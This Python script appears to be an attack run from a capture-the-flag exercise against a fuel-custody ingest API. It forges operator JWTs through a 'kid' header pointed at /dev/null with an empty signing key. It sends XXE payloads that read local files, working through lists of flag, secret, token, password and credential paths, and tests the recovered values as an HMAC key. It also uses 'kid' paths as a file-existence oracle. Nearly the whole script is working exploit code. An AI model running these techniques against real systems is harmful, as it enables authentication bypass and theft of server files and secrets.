#!/usr/bin/env python3
"""round35 — Read flag files from /var/local/xxe and /var/local/lfi volumes"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                val = d.get("summary",{}).get(field,"")
                return "FOUND", val
            except:
                return "RAW200", r.text[:300]
        elif r.status_code == 400:
            return "REJECTED", r.text[:200]
        else:
            return f"HTTP{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:200]

# ============================================================
print("="*70)
print("FLAG FILE EXTRACTION — /var/local/xxe")
print("="*70)

xxe_paths = [
    "/var/local/xxe/flag",
    "/var/local/xxe/flag.txt",
    "/var/local/xxe/FLAG",
    "/var/local/xxe/FLAG.txt",
    "/var/local/xxe/secret",
    "/var/local/xxe/secret.txt",
    "/var/local/xxe/probe_secret",
    "/var/local/xxe/PROBE_SECRET",
    "/var/local/xxe/key",
    "/var/local/xxe/key.txt",
    "/var/local/xxe/.flag",
    "/var/local/xxe/.secret",
    "/var/local/xxe/token",
    "/var/local/xxe/password",
    "/var/local/xxe/credentials",
]

for fp in xxe_paths:
    status, val = xxe_read(fp)
    if status == "FOUND" and val:
        print(f"  >>> {fp}: '{val}' <<<")
    elif status == "REJECTED":
        print(f"  [EXISTS/BINARY] {fp}")
    elif status == "FOUND":
        pass  # empty = doesn't exist
    else:
        print(f"  [{status}] {fp}")

# ============================================================
print("\n"+"="*70)
print("FLAG FILE EXTRACTION — /var/local/lfi")
print("="*70)

lfi_paths = [
    "/var/local/lfi/flag",
    "/var/local/lfi/flag.txt",
    "/var/local/lfi/FLAG",
    "/var/local/lfi/FLAG.txt",
    "/var/local/lfi/secret",
    "/var/local/lfi/secret.txt",
    "/var/local/lfi/probe_secret",
    "/var/local/lfi/PROBE_SECRET",
    "/var/local/lfi/key",
    "/var/local/lfi/key.txt",
    "/var/local/lfi/.flag",
    "/var/local/lfi/.secret",
    "/var/local/lfi/token",
    "/var/local/lfi/password",
    "/var/local/lfi/credentials",
]

for fp in lfi_paths:
    status, val = xxe_read(fp)
    if status == "FOUND" and val:
        print(f"  >>> {fp}: '{val}' <<<")
    elif status == "REJECTED":
        print(f"  [EXISTS/BINARY] {fp}")
    elif status == "FOUND":
        pass
    else:
        print(f"  [{status}] {fp}")

# ============================================================
print("\n"+"="*70)
print("TRY DIFFERENT FIELD FOR BINARY FILES")
print("="*70)

# If any files were REJECTED in remarks, try reference and carrier fields
binary_files = []
for fp in xxe_paths + lfi_paths:
    status, val = xxe_read(fp)
    if status == "REJECTED":
        binary_files.append(fp)

for fp in binary_files:
    for field in ["reference", "carrier"]:
        status, val = xxe_read(fp, field)
        if status == "FOUND" and val:
            print(f"  >>> {fp} [{field}]: '{val}' <<<")
        elif status == "REJECTED":
            print(f"  [{field}] {fp}: REJECTED")

# ============================================================
print("\n"+"="*70)
print("ALSO TRY: PROBE SECRET AS FILE")
print("="*70)

probe_paths = [
    "/var/local/xxe/probe",
    "/var/local/lfi/probe",
    "/var/local/xxe/hmac",
    "/var/local/lfi/hmac",
    "/var/local/xxe/signing_key",
    "/var/local/lfi/signing_key",
    "/var/local/xxe/probe.key",
    "/var/local/lfi/probe.key",
    # Maybe KHS format
    "/var/local/xxe/KHS",
    "/var/local/lfi/KHS",
    "/var/local/xxe/khs",
    "/var/local/lfi/khs",
]

for fp in probe_paths:
    status, val = xxe_read(fp)
    if status == "FOUND" and val:
        print(f"  >>> {fp}: '{val}' <<<")
    elif status == "REJECTED":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("TEST PROBE SECRET WITH ANY FOUND VALUES")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Collect all found values and test them as probe keys
found_values = []
for fp in xxe_paths + lfi_paths + probe_paths:
    status, val = xxe_read(fp)
    if status == "FOUND" and val:
        found_values.append((fp, val))

for fp, val in found_values:
    for key_candidate in [val.encode(), val.strip().encode(), (val+'\n').encode()]:
        computed = hm.new(key_candidate, known_url, hashlib.sha256).digest()
        if computed == known_sig:
            print(f"  PROBE KEY MATCH from {fp}: '{val}' <<<<<<")

if not found_values:
    print("  No values found to test")

# ============================================================
print("\n"+"="*70)
print("BONUS: USE KID TO READ FLAG FILES")
print("="*70)

# Since kid reads files as HMAC keys, we can try kid pointing to flag files
# and sign with candidate key values to check
# But first, just see if the files are accessible via kid mechanism

# Try kid="/var/local/xxe/flag.txt" with various keys
test_files = [
    "/var/local/xxe/flag", "/var/local/xxe/flag.txt",
    "/var/local/lfi/flag", "/var/local/lfi/flag.txt",
]

for target_file in test_files:
    # Try with empty key first (would work if file is empty/doesn't exist)
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":target_file},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    token = m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

    try:
        r = requests.get(f"{CASPI}/api/auth/me",
            headers={"Authorization": f"Bearer {token}"}, timeout=10)
        if r.status_code == 200:
            print(f"  kid={target_file}: [200] FILE IS EMPTY OR NOT FOUND")
        elif r.status_code == 403:
            print(f"  kid={target_file}: [403] FILE EXISTS WITH CONTENT (key != empty)")
        elif r.status_code == 500:
            print(f"  kid={target_file}: [500] FILE READ ERROR")
        else:
            print(f"  kid={target_file}: [{r.status_code}]")
    except Exception as e:
        print(f"  kid={target_file}: ERR {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
